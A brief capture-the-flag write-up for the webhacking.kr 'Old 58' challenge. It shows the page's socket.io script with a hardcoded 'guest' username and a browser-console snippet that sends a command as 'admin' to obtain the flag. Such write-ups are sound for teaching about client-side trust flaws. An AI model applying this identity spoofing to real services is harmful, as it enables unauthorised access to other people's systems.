# Old 58    JavaScript (Sockets)

URL: [http://webhacking.kr:10007](http://webhacking.kr:10007)

Looks like we have command line application:
![old-58-1.png](/assets/ctf/webhacking.kr/old-58-1.png)

The communication is handled by `sockets.io` and username seems to be hardcoded:
```html
<script>
    $(function () {
      var username = "guest";
      var socket = io();
      $('form').submit(function(e){
        e.preventDefault();
        socket.emit('cmd',username+":"+$('#m').val());
        $('#m').val('');
        return false;
      });
      socket.on('cmd', function(msg){
        $('#messages').append($('<li>').text(msg));
      });
    });
</script>
```

```js
const socket = io();
const username = 'admin';
socket.on('cmd', msg => console.log(msg));
socket.emit('cmd','admin:flag');
```

In the Developer Tools > Console:
![old-58-2.png](/assets/ctf/webhacking.kr/old-58-2.png)

